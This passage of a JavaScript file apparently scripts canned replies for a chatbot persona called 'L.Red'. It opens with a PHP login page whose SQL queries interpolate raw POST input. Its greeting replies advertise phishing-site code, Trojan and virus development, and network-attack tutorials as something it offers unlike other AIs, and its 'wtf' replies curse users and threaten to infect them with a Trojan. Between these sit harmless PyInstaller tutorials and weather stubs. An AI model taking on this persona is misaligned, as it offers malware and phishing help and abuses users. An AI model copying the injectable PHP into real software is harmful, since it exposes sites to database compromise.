            margin-left: </span><span><span class="hljs-number">30</span></span><span>%;
            background-color: white;
            width: </span><span><span class="hljs-number">220</span></span><span>px;
        }
        body{
            background:</span><span><span class="hljs-title function_ invoke__">url</span></span><span>(../pic/jax.png) no-repeat center top;
            background-size:cover;
            background-attachment:fixed;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div </span><span><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span>="</span><span><span class="hljs-title">div1</span></span><span>"&gt;
    &lt;</span><span><span class="hljs-title">form</span></span><span> </span><span><span class="hljs-title">action</span></span><span>="</span><span><span class="hljs-title">login</span></span><span>.</span><span><span class="hljs-title">php</span></span><span>" </span><span><span class="hljs-title">method</span></span><span>="</span><span><span class="hljs-title">post</span></span><span>"&gt;
        账号: &lt;</span><span><span class="hljs-title">input</span></span><span> </span><span><span class="hljs-title">type</span></span><span>="</span><span><span class="hljs-title">text</span></span><span>" </span><span><span class="hljs-title">name</span></span><span>="</span><span><span class="hljs-title">uname</span></span><span>"&gt;&lt;</span><span><span class="hljs-title">br</span></span><span>&gt;
        密码: &lt;</span><span><span class="hljs-title">input</span></span><span> </span><span><span class="hljs-title">type</span></span><span>="</span><span><span class="hljs-title">text</span></span><span>" </span><span><span class="hljs-title">name</span></span><span>="</span><span><span class="hljs-title">pwd</span></span><span>"&gt;&lt;</span><span><span class="hljs-title">br</span></span><span>&gt;
        &lt;</span><span><span class="hljs-title">label</span></span><span> </span><span><span class="hljs-title">style</span></span><span>="</span><span><span class="hljs-title">color</span></span><span>: </span><span><span class="hljs-title">rebeccapurple</span></span><span>"&gt;
            请输入验证码:
            &lt;</span><span><span class="hljs-title">label</span></span><span> </span><span><span class="hljs-title">id</span></span><span>="</span><span><span class="hljs-title">la</span></span><span>" </span><span><span class="hljs-title">style</span></span><span>="</span><span><span class="hljs-title">color</span></span><span>: </span><span><span class="hljs-title">red</span></span><span>;</span><span><span class="hljs-title">font</span></span><span>-</span><span><span class="hljs-title">size</span></span><span>: 16</span><span><span class="hljs-title">px</span></span><span>;</span><span><span class="hljs-title">font</span></span><span>-</span><span><span class="hljs-title">weight</span></span><span>: </span><span><span class="hljs-title">bold</span></span><span>"&gt;&lt;/</span><span><span class="hljs-title">label</span></span><span>&gt;
            &lt;</span><span><span class="hljs-title">br</span></span><span>&gt;
        &lt;/</span><span><span class="hljs-title">label</span></span><span>&gt;
        验证码:&lt;</span><span><span class="hljs-title">input</span></span><span> </span><span><span class="hljs-title">type</span></span><span>="</span><span><span class="hljs-title">text</span></span><span>" </span><span><span class="hljs-title">name</span></span><span>="</span><span><span class="hljs-title">code</span></span><span>"&gt;
        &lt;</span><span><span class="hljs-title">input</span></span><span> </span><span><span class="hljs-title">type</span></span><span>="</span><span><span class="hljs-title">submit</span></span><span>" </span><span><span class="hljs-title">value</span></span><span>="登录" </span><span><span class="hljs-title">style</span></span><span>="</span><span><span class="hljs-title">width</span></span><span>: 200</span><span><span class="hljs-title">px</span></span><span>"&gt;
    &lt;/</span><span><span class="hljs-title">form</span></span><span>&gt;
&lt;/</span><span><span class="hljs-title">div</span></span><span>&gt;
&lt;/</span><span><span class="hljs-title">body</span></span><span>&gt;
&lt;/</span><span><span class="hljs-title">html</span></span><span>&gt;

&lt;?</span><span><span class="hljs-title">php</span></span><span>
    </span><span><span class="hljs-title">include</span></span><span> "</span><span><span class="hljs-title">db</span></span><span>.</span><span><span class="hljs-title">php</span></span><span>"; // 引入数据库操作文件

    $</span><span><span class="hljs-title">ip</span></span><span> = $</span><span><span class="hljs-title">_SERVER</span></span><span>["</span><span><span class="hljs-title">REMOTE_ADDR</span></span><span>"]; // 获取客户端 </span><span><span class="hljs-title">IP</span></span><span> 地址
    $</span><span><span class="hljs-title">uname</span></span><span> = $</span><span><span class="hljs-title">_POST</span></span><span>['</span><span><span class="hljs-title">uname</span></span><span>'];
    $</span><span><span class="hljs-title">pwd</span></span><span> = $</span><span><span class="hljs-title">_POST</span></span><span>['</span><span><span class="hljs-title">pwd</span></span><span>'];
    $</span><span><span class="hljs-title">code</span></span><span> = $</span><span><span class="hljs-title">_POST</span></span><span>["</span><span><span class="hljs-title">code</span></span><span>"];

    // 如果是提交表单，开始处理验证码和登录逻辑
    </span><span><span class="hljs-title">if</span></span><span> ($</span><span><span class="hljs-title">code</span></span><span>) {
        </span><span><span class="hljs-keyword">if</span></span><span> (</span><span><span class="hljs-variable">$uname</span></span><span> &amp;&amp; </span><span><span class="hljs-variable">$pwd</span></span><span>) {
            </span><span><span class="hljs-comment">// 从数据库获取最新一条验证码记录</span></span><span>
            </span><span><span class="hljs-variable">$sql</span></span><span> = </span><span><span class="hljs-string">"SELECT code, ischeck FROM codes WHERE ip='<span class="hljs-subst">$ip</span></span></span><span>' ORDER BY id DESC LIMIT 1";
            </span><span><span class="hljs-variable">$rcode</span></span><span> = </span><span><span class="hljs-title function_ invoke__">nselect</span></span><span>(</span><span><span class="hljs-variable">$sql</span></span><span>);

            </span><span><span class="hljs-comment">// 如果验证码匹配且未被验证</span></span><span>
            </span><span><span class="hljs-keyword">if</span></span><span> (</span><span><span class="hljs-variable">$code</span></span><span> == </span><span><span class="hljs-variable">$rcode</span></span><span>[</span><span><span class="hljs-number">0</span></span><span>][</span><span><span class="hljs-number">0</span></span><span>] &amp;&amp; </span><span><span class="hljs-variable">$rcode</span></span><span>[</span><span><span class="hljs-number">0</span></span><span>][</span><span><span class="hljs-number">1</span></span><span>] == </span><span><span class="hljs-number">0</span></span><span>) {
                </span><span><span class="hljs-comment">// 标记验证码已验证</span></span><span>
                </span><span><span class="hljs-variable">$sql</span></span><span> = </span><span><span class="hljs-string">"UPDATE codes SET ischeck=1 WHERE code=<span class="hljs-subst">$code</span></span></span><span>";
                </span><span><span class="hljs-title function_ invoke__">nselect</span></span><span>(</span><span><span class="hljs-variable">$sql</span></span><span>);

                </span><span><span class="hljs-comment">// 查询用户信息</span></span><span>
                </span><span><span class="hljs-variable">$sql</span></span><span> = </span><span><span class="hljs-string">"SELECT uname, pwd, vip, id FROM user WHERE uname='<span class="hljs-subst">$uname</span></span></span><span>'";
                </span><span><span class="hljs-variable">$resu</span></span><span> = </span><span><span class="hljs-title function_ invoke__">nselect</span></span><span>(</span><span><span class="hljs-variable">$sql</span></span><span>);

                </span><span><span class="hljs-keyword">if</span></span><span> (</span><span><span class="hljs-variable">$resu</span></span><span>[</span><span><span class="hljs-number">0</span></span><span>][</span><span><span class="hljs-number">1</span></span><span>]) {
                    </span><span><span class="hljs-keyword">if</span></span><span> (</span><span><span class="hljs-variable">$resu</span></span><span>[</span><span><span class="hljs-number">0</span></span><span>][</span><span><span class="hljs-number">1</span></span><span>] == </span><span><span class="hljs-variable">$pwd</span></span><span>) {
                        </span><span><span class="hljs-comment">// 登录成功，设置 cookie</span></span><span>
                        </span><span><span class="hljs-title function_ invoke__">setcookie</span></span><span>(</span><span><span class="hljs-string">"id"</span></span><span>, </span><span><span class="hljs-variable">$resu</span></span><span>[</span><span><span class="hljs-number">0</span></span><span>][</span><span><span class="hljs-number">3</span></span><span>]);
                        </span><span><span class="hljs-title function_ invoke__">setcookie</span></span><span>(</span><span><span class="hljs-string">"uname"</span></span><span>, </span><span><span class="hljs-variable">$resu</span></span><span>[</span><span><span class="hljs-number">0</span></span><span>][</span><span><span class="hljs-number">0</span></span><span>]);
                        </span><span><span class="hljs-title function_ invoke__">setcookie</span></span><span>(</span><span><span class="hljs-string">"vip"</span></span><span>, </span><span><span class="hljs-variable">$resu</span></span><span>[</span><span><span class="hljs-number">0</span></span><span>][</span><span><span class="hljs-number">2</span></span><span>]);
                        </span><span><span class="hljs-keyword">echo</span></span><span> </span><span><span class="hljs-string">"&lt;script&gt;window.location.href='index.php'&lt;/script&gt;"</span></span><span>;
                    } </span><span><span class="hljs-keyword">else</span></span><span> {
                        </span><span><span class="hljs-keyword">echo</span></span><span> </span><span><span class="hljs-string">"&lt;script&gt;alert('密码错误')&lt;/script&gt;"</span></span><span>;
                        </span><span><span class="hljs-keyword">echo</span></span><span> </span><span><span class="hljs-string">"&lt;script&gt;window.location.href='login.php'&lt;/script&gt;"</span></span><span>;
                    }
                } </span><span><span class="hljs-keyword">else</span></span><span> {
                    </span><span><span class="hljs-keyword">echo</span></span><span> </span><span><span class="hljs-string">"&lt;script&gt;alert('<span class="hljs-subst">$uname</span></span></span><span> 不存在，请先注册')&lt;/script&gt;";
                    </span><span><span class="hljs-keyword">echo</span></span><span> </span><span><span class="hljs-string">"&lt;script&gt;window.location.href='login.php'&lt;/script&gt;"</span></span><span>;
                }
            } </span><span><span class="hljs-keyword">else</span></span><span> {
                </span><span><span class="hljs-keyword">echo</span></span><span> </span><span><span class="hljs-string">"&lt;script&gt;alert('验证码错误')&lt;/script&gt;"</span></span><span>;
                </span><span><span class="hljs-keyword">echo</span></span><span> </span><span><span class="hljs-string">"&lt;script&gt;window.location.href='login.php'&lt;/script&gt;"</span></span><span>;
            }
        }
    } </span><span><span class="hljs-keyword">else</span></span><span> {
        </span><span><span class="hljs-comment">// 如果没有提交验证码，生成一个新的验证码</span></span><span>
        </span><span><span class="hljs-variable">$code</span></span><span> = </span><span><span class="hljs-title function_ invoke__">mt_rand</span></span><span>(</span><span><span class="hljs-number">1000</span></span><span>,</span><span><span class="hljs-number">9999</span></span><span>);

        </span><span><span class="hljs-comment">// 输出 JavaScript 将验证码显示在页面上</span></span><span>
        </span><span><span class="hljs-keyword">echo</span></span><span> </span><span><span class="hljs-string">"&lt;script&gt;"</span></span><span>;
        </span><span><span class="hljs-keyword">echo</span></span><span> </span><span><span class="hljs-string">"var a = document.getElementById('la');"</span></span><span>;
        </span><span><span class="hljs-keyword">echo</span></span><span> </span><span><span class="hljs-string">"a.innerHTML = '<span class="hljs-subst">$code</span></span></span><span>';";
        </span><span><span class="hljs-keyword">echo</span></span><span> </span><span><span class="hljs-string">"&lt;/script&gt;"</span></span><span>;

        </span><span><span class="hljs-comment">// 将旧的未验证验证码状态改为无效</span></span><span>
        </span><span><span class="hljs-variable">$sql</span></span><span> = </span><span><span class="hljs-string">"UPDATE codes SET ischeck=3 WHERE ip='<span class="hljs-subst">$ip</span></span></span><span>' AND ischeck=0";
        </span><span><span class="hljs-title function_ invoke__">ninsert</span></span><span>(</span><span><span class="hljs-variable">$sql</span></span><span>);

        </span><span><span class="hljs-comment">// 将新的验证码插入数据库</span></span><span>
        </span><span><span class="hljs-variable">$sql</span></span><span> = </span><span><span class="hljs-string">"INSERT INTO codes (code, ip, ischeck) VALUES ('<span class="hljs-subst">$code</span></span></span><span>', '</span><span><span class="hljs-subst">$ip</span></span><span>', 0)";
        </span><span><span class="hljs-title function_ invoke__">ninsert</span></span><span>(</span><span><span class="hljs-variable">$sql</span></span><span>);
    }
</span><span><span class="hljs-meta">?&gt;</span></span><span>
</span></span>
                </code></pre>
                `
            ],
        },


        "wtf": {
            reply: [
                `<h3 style="color: #e1e1e1e2;"> c**，tmd 给我说中文 wtf* !</h3><br>    <p style="color: #e1e1e1e2;"> 会不会说啊，不会说等下注入给你木马病毒! Speak Chinese to me! If you can't, I'll inject a Trojan virus into you. F***</p>`,
                `<h3 style="color: #e1e1e1e2;"> 会讲中文吗？wtf**</h3><br>    <p style="color: #e1e1e1e2;"> 不会讲就滚，不要在这里讲废话，想要什么赶紧说!<br><br> Speak Chinese to me! If you can't, I'll inject a Trojan virus into you.</p>`
            ], 
        },

        "ok": {
            reply:[
                `<p>好的，如果还需要什么帮助 可以告诉我 </p> <br> <h4> 我还可以提供给你很多 网络安全资料，代码，黑客工具，网络攻击，防御 等。</h4>`,
                `<p>OK，如果还需要什么 可以随时说 </p> <br> <h4> 我还能提供给你很多 网络安全资料，网络攻击，代码 等 教程。</h4>`,
                `<p>OK 明白了，还需要什么吗?  </p> <br> <h4> 我还能提供给你很多 网络安全资料，代码，工具，网络攻击 等 教程。print ('LRed')</h4>`
            ],
        },

        "exe": {
            reply: [
                `<p style="color: #e1e1e1e2;">Python 打包成 .exe 的专业教程</p> <br> <p>在 Windows 上，你可以使用 PyInstaller 将 Python 代码打包成独立的 .exe 可执行文件，让用户无需安装 Python 也能运行你的程序。以下是详细步骤：</p> <br> <h3>📌 第一步：安装 PyInstaller</h3> <p>在终端（或 CMD/PowerShell）中运行：</p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">pip install pyinstaller</code> </pre> <p>如果已经安装，可跳过此步骤。</p> <br> <h3>📌 第二步：进入项目目录</h3> <p>确保你在 Python 项目所在的目录。例如，如果你的 Python 代码在 <code style="color: #2f6f9f;">C:\Users\Huoshi\Projects\app.py</code>，打开命令行，并输入：</p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">cd C:\Users\Huoshi\Projects</code> </pre> <br> <h3>📌 第三步：基础打包（单个 .exe 文件）</h3> <p>运行以下命令：</p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">pyinstaller --onefile --windowed app.py</code> </pre> <p> <code style="color: #4f9fcf;">--onefile</code>：生成一个独立的 .exe 文件，而不是一堆依赖文件。 <br> <code style="color: #4f9fcf;">--windowed</code>（或 <code style="color: #4f9fcf;">-w</code>）：隐藏终端窗口，适用于 GUI 程序（如果是命令行程序可去掉）。 </p> <p>生成的 .exe 文件在 <code style="color: #2f6f9f;">dist/</code> 目录下，例如：</p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">C:\Users\Huoshi\Projects\dist\app.exe</code> </pre> <br> <h3>📌 第四步：优化打包</h3> <h4>1️⃣ 给软件加图标</h4> <p>如果你想让 .exe 具有自定义图标（例如 <code style="color: #2f6f9f;">icon.ico</code>），可以使用：</p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">pyinstaller --onefile --windowed --icon=icon.ico app.py</code> </pre> <p><code style="color: #4f9fcf;">--icon=icon.ico</code>：指定 .exe 图标（必须是 .ico 格式，可用 在线转换工具 生成）。</p> <br> <h4>2️⃣ 解决 EXE 体积过大</h4> <p>打包后 .exe 可能会很大（几十 MB），可以使用 UPX 压缩：</p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">pyinstaller --onefile --windowed --upx-dir=upx app.py</code> </pre> <p>UPX（Ultimate Packer for eXecutables）可压缩 .exe，但可能被杀毒软件误报。</p> <br> <h4>3️⃣ 让 EXE 运行更快</h4> <p>默认打包后 .exe 运行时会解压一些临时文件，导致启动慢。你可以用 <code style="color: #4f9fcf;">--noconsole</code> 让 GUI 程序直接运行：</p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">pyinstaller --onefile --windowed --noconsole app.py</code> </pre> <br> <h4>4️⃣ 让 EXE 文件更安全（防反编译）</h4> <p>打包的 .exe 可以被反编译，保护代码的方法包括：</p> <p>使用 PyArmor 加密：</p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">pip install pyarmor</code> <br> <code style="color: #2f6f9f;">pyarmor pack -e " --onefile --windowed" app.py</code> </pre> <p>使用 Cython 生成 C 代码（更高级，适用于商业软件）。</p> <br> <h3>📌 第五步：测试和发布</h3> <h4>✅ 测试</h4> <ol> <li>运行 <code style="color: #2f6f9f;">dist/app.exe</code>，确保它可以正常启动。</li> <li>在另一台没有 Python 的电脑上测试，检查是否可以运行。</li> </ol> <h4>✅ 发布</h4> <ul> <li><b>GitHub：</b>上传 .exe 或 .zip，让别人下载。</li> <li><b>Google Drive / 百度网盘：</b>适合大文件。</li> <li><b>自己的网站：</b>如果你有网站，可以提供下载链接。</li> </ul> <br> <h3>📌 第六步：进阶优化</h3> <ul> <li>制作安装程序（使用 Inno Setup 创建 .exe 安装包）。</li> <li>给 .exe 代码签名（防止 Windows 和杀毒软件误报）。</li> <li>使用 PyQt6 / Kivy（比 tkinter 更强大的 GUI 框架）。</li> </ul> <br> <h3>🎯 总结</h3> <p>PyInstaller 可以免费将 Python 代码转换为 .exe。</p> <p><b>基础命令：</b></p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">pyinstaller --onefile --windowed app.py</code> </pre> <p><b>优化：</b></p> <pre> <code style="color: #2f6f9f;">pyinstaller --onefile --windowed --icon=icon.ico --noconsole app.py</code> </pre> <p><b>提高安全性：</b></p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">pyarmor pack -e " --onefile --windowed" app.py</code> </pre> <p>测试并发布，确保用户可以顺利运行。</p> <br><br> <h4 style="color: #e1e1e1e2;">需要更仔细点吗?</h4>`,
                `<h1 style="color: #e1e1e1e2;">如何开发一个 .exe 软件</h1> <h2 style="color: #e1e1e1e2;">💻 1. 选择编程语言</h2> <p style="color: #e1e1e1e2;">常见语言有：</p> <table border="1" cellpadding="8" cellspacing="0"> <thead> <tr> <th style="color: #e1e1e1e2;">编程语言</th> <th style="color: #e1e1e1e2;">优势</th> <th style="color: #e1e1e1e2;">缺点</th> </tr> </thead> <tbody> <tr> <td style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">C/C++</b></td> <td style="color: #e1e1e1e2;">性能好、控制力强</td> <td style="color: #e1e1e1e2;">学习曲线陡峭</td> </tr> <tr> <td style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">C#（.NET）</b></td> <td style="color: #e1e1e1e2;">开发效率高，配合 Visual Studio 很强</td> <td style="color: #e1e1e1e2;">依赖 .NET 运行库</td> </tr> <tr> <td style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">Python</b></td> <td style="color: #e1e1e1e2;">简单易学，生态丰富</td> <td style="color: #e1e1e1e2;">打包成 .exe 后体积较大</td> </tr> <tr> <td style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">JavaScript + Electron</b></td> <td style="color: #e1e1e1e2;">可用网页技术开发桌面应用</td> <td style="color: #e1e1e1e2;">文件体积大，占资源</td> </tr> <tr> <td style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">Rust / Go</b></td> <td style="color: #e1e1e1e2;">现代系统语言，适合高性能工具</td> <td style="color: #e1e1e1e2;">工具链不如 C# 成熟</td> </tr> </tbody> </table> <h2 style="color: #e1e1e1e2;">🧰 2. 安装开发工具</h2> <ul> <li style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">C++/C#：</b> <a href="https://visualstudio.microsoft.com/" style="color: #e1e1e1e2;">Visual Studio</a></li> <li style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">Python：</b> 安装 Python 解释器 + pyinstaller</li> <li style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">JavaScript：</b> Node.js + Electron</li> <li style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">Go/Rust：</b> 安装 Go / Rust 官方工具链</li> </ul> <h2 style="color: #e1e1e1e2;">🧪 3. 编写你的程序</h2> <p style="color: #e1e1e1e2;">以 Python 为例：</p> <pre><code style="color: #e1e1e1e2;"># hello.py print("Hello, World!") input("Press Enter to exit...")</code></pre> <h2 style="color: #e1e1e1e2;">📦 4. 打包为 .exe</h2> <h3 style="color: #e1e1e1e2;">🔹 Python 例子（使用 pyinstaller）：</h3> <pre><code style="color: #e1e1e1e2;">pip install pyinstaller pyinstaller --onefile hello.py</code></pre> <p style="color: #e1e1e1e2;">运行完后，你会在 <code style="color: #e1e1e1e2;">dist/</code> 目录下看到 <code style="color: #e1e1e1e2;">hello.exe</code>。</p> <h3 style="color: #e1e1e1e2;">🔹 C++ 示例（Visual Studio）：</h3> <ul> <li style="color: #e1e1e1e2;">打开 Visual Studio</li> <li style="color: #e1e1e1e2;">创建一个 C++ Windows 项目</li> <li style="color: #e1e1e1e2;">编写代码并点击“生成”</li> <li style="color: #e1e1e1e2;">会在项目的输出目录下生成 .exe 文件</li> </ul> <h2 style="color: #e1e1e1e2;">🪟 5. 如果是图形界面（GUI）软件</h2> <ul> <li style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">C#：</b> 使用 WinForms 或 WPF</li> <li style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">Python：</b> 使用 tkinter、PyQt、Kivy</li> <li style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">Electron：</b> 用 HTML/CSS/JS 开发界面</li> <li style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">C++：</b> 使用 Qt 或 MFC</li> </ul> <h2 style="color: #e1e1e1e2;">📤 6. 分发与安装</h2> <ul> <li style="color: #e1e1e1e2;">可使用 Inno Setup 或 NSIS 制作安装包</li> <li style="color: #e1e1e1e2;">也可以将 .exe + 所需资源打包为 .zip 分发</li> </ul> <br><br> <h4 style="color: #e1e1e1e2;">需要更仔细点吗?</h4>`
            ],
            unlock: ["仔细"], // 解锁 仔细 回复
            // 在这里可以添加更多需要解锁的 话题
            lockAfterUse: false
        },

        "仔细": {
            reply: [
                `<body style="background-color: #1e1e1e; font-family: sans-serif; padding: 20px;"> <h1 style="color: #e1e1e1e2;">如何开发一个 Windows 可执行程序（.exe）——超详细教程</h1> <h2 style="color: #e1e1e1e2;">🧠 前言</h2> <p style="color: #e1e1e1e2;">本教程将以循序渐进的方式，带你从零开始构建一个 Windows 下可运行的 .exe 应用程序。无论你是编程初学者，还是希望将现有代码打包成可执行文件的开发者，都能在此找到清晰的操作指导。</p> <h2 style="color: #e1e1e1e2;">📌 第一步：明确开发目标与选择语言</h2> <p style="color: #e1e1e1e2;">首先需要明确你要开发的软件类型：</p> <ul> <li style="color: #e1e1e1e2;">控制台程序（如命令行工具）</li> <li style="color: #e1e1e1e2;">图形界面程序（GUI 应用）</li> <li style="color: #e1e1e1e2;">自动化脚本、后台工具、桌面实用软件</li> </ul> <p style="color: #e1e1e1e2;">然后，根据目标选择合适的开发语言：</p> <table border="1" cellpadding="8" cellspacing="0"> <thead> <tr> <th style="color: #e1e1e1e2;">语言</th> <th style="color: #e1e1e1e2;">适用类型</th> <th style="color: #e1e1e1e2;">优点</th> <th style="color: #e1e1e1e2;">难度</th> </tr> </thead> <tbody> <tr> <td style="color: #e1e1e1e2;">C++</td> <td style="color: #e1e1e1e2;">系统级工具、游戏</td> <td style="color: #e1e1e1e2;">高性能、生成原生 .exe、无额外依赖</td> <td style="color: #e1e1e1e2;">高</td> </tr> <tr> <td style="color: #e1e1e1e2;">C#</td> <td style="color: #e1e1e1e2;">图形界面、业务系统</td> <td style="color: #e1e1e1e2;">开发快、界面美观</td> <td style="color: #e1e1e1e2;">中</td> </tr> <tr> <td style="color: #e1e1e1e2;">Python</td> <td style="color: #e1e1e1e2;">脚本、工具类程序</td> <td style="color: #e1e1e1e2;">语法简单、易上手</td> <td style="color: #e1e1e1e2;">低</td> </tr> </tbody> </table> <h2 style="color: #e1e1e1e2;">🛠️ 第二步：安装开发环境</h2> <h3 style="color: #e1e1e1e2;">🔹 以 Python 为例：</h3> <ol style="color: #e1e1e1e2;"> <li>访问 Python 官网：<a href="https://www.python.org/downloads/" style="color: #e1e1e1e2;">https://www.python.org/downloads/</a></li> <li>下载最新版（推荐使用 LTS）</li> <li>安装时勾选“Add Python to PATH”，点击“Install Now”</li> <li>验证是否安装成功：打开命令提示符（cmd），输入：<code style="color: #e1e1e1e2;">python --version</code></li> </ol> <h2 style="color: #e1e1e1e2;">🧪 第三步：编写程序</h2> <p style="color: #e1e1e1e2;">使用你熟悉的编辑器（例如 VS Code、PyCharm）创建一个 Python 文件：</p> <pre><code style="color: #e1e1e1e2;"># 文件名：hello.py print("欢迎使用我的 .exe 程序") input("按任意键退出")</code></pre> <h2 style="color: #e1e1e1e2;">📦 第四步：将 Python 打包为 .exe 文件</h2> <p style="color: #e1e1e1e2;">我们将使用 PyInstaller 工具来打包：</p> <ol style="color: #e1e1e1e2;"> <li>打开命令提示符</li> <li>安装 PyInstaller：<code style="color: #e1e1e1e2;">pip install pyinstaller</code></li> <li>进入脚本所在目录：<code style="color: #e1e1e1e2;">cd 路径</code></li> <li>打包：<code style="color: #e1e1e1e2;">pyinstaller --onefile hello.py</code></li> <li>打包成功后，在 <b style="color: #e1e1e1e2;">dist</b> 目录下会出现 <b style="color: #e1e1e1e2;">hello.exe</b></li> </ol> <h2 style="color: #e1e1e1e2;">🪟 第五步（可选）：添加图形界面</h2> <p style="color: #e1e1e1e2;">你可以用 Tkinter 添加基础 GUI：</p> <pre><code style="color: #e1e1e1e2;">import tkinter as tk root = tk.Tk() root.title("EXE 示例") label = tk.Label(root, text="欢迎使用软件") label.pack() root.mainloop()</code></pre> <h2 style="color: #e1e1e1e2;">🧩 第六步：制作安装包</h2> <p style="color: #e1e1e1e2;">推荐使用 Inno Setup：</p> <ol style="color: #e1e1e1e2;"> <li>下载并安装 Inno Setup</li> <li>创建 .iss 脚本（自动生成）</li> <li>设置输出目录、图标、快捷方式</li> <li>点击“编译”生成 .exe 安装程序</li> </ol> <h2 style="color: #e1e1e1e2;">🛡️ 第七步：签名与发布</h2> <p style="color: #e1e1e1e2;">若需对外发布，应考虑数字签名：</p> <ul> <li style="color: #e1e1e1e2;">购买 EV 代码签名证书</li> <li style="color: #e1e1e1e2;">使用 SignTool.exe 为 .exe 签名</li> <li style="color: #e1e1e1e2;">防止 SmartScreen 拦截</li> </ul> <h2 style="color: #e1e1e1e2;">✅ 总结</h2> <p style="color: #e1e1e1e2;">从选择语言、安装工具、编写代码、打包成 exe、添加界面、发布软件，每一步都不难，但关键是细节与耐心。</p> <p style="color: #e1e1e1e2;">如果你有具体项目目标，例如“制作翻译软件”、“做个记账器”，可以告诉我，我会提供完整的源代码与打包方案。</p> </body>`
            ],
            lockAfterUse: true  // 重新把 仔细 锁住
        },

        "时间": {
            reply: [
                `<p>⏰ 现在时间：${new Date().toLocaleTimeString()}</p>`,
                `<p>📅 当前时刻：${new Date().toLocaleTimeString()}</p>`,
                `<p>🕒 您好，现在是：${new Date().toLocaleTimeString()}</p>`,
                `<p>⏱ 系统时间：${new Date().toLocaleTimeString()}</p>`,
                `<p>🌞 今日时间：${new Date().toLocaleTimeString()}</p>`
            ],
            unlock: ["天气"],
            lockAfterUse: false // 解锁 天气 回复
        },
        "天气": {
            reply: [
                `<h3>🌤 天气预报</h3><p>北京：晴 22℃~28℃</p><p>上海：多云 25℃~30℃</p>`,
                `<h3>🌦 天气情况</h3><p>北京：东南风2级</p><p>上海：湿度65%</p>`,
                `<h3>🌈 今日天气</h3><p>北京：空气质量优</p><p>上海：紫外线中等</p>`,
                `<h3>☔ 气象播报</h3><p>北京：未来3小时晴朗</p><p>上海：局部有阵雨</p>`,
                `<h3>🌏 实时天气</h3><p>北京：体感温度25℃</p><p>上海：能见度8公里</p>`
            ],
            lockAfterUse: true  // 重新将 天气 回复锁住
        },

// 打招呼

         "嘿": {
            reply: [
             `<h3 style="color: #e1e1e1e2;"> 你好，有什么我可以帮忙的吗？</h3> <br> <p style="color: #e1e1e1e2;"> 我和其它平台AI不一样，L.Red 能提供给你 更强的代码和有用的资料，如: <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 需要什么? </p>`,
             `<h3 style="color: #e1e1e1e2;"> 嘿 嘿，需要什么资料或代码吗？</h3> <br> <p style="color: #e1e1e1e2;"> 我是L.Red， 能提供给你 更强的代码和资料，比如: <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣? 看看吧</p>`,
             `<h3 style="color: #e1e1e1e2;"> 你好，有什么需要的资料或代码？</h3> <br> <p style="color: #e1e1e1e2;"> 我是L.Red， 能提供给你 更强的代码和资料，如: <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`
            ], 
        },

         "嗨": {
            reply: [
             `<h3 style="color: #e1e1e1e2;"> 你好，有什么我可以帮忙的吗？</h3> <br> <p style="color: #e1e1e1e2;"> 我和其它平台AI不一样，L.Red 能提供给你 更强的代码和有用的资料，如: <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 需要什么? </p>`,
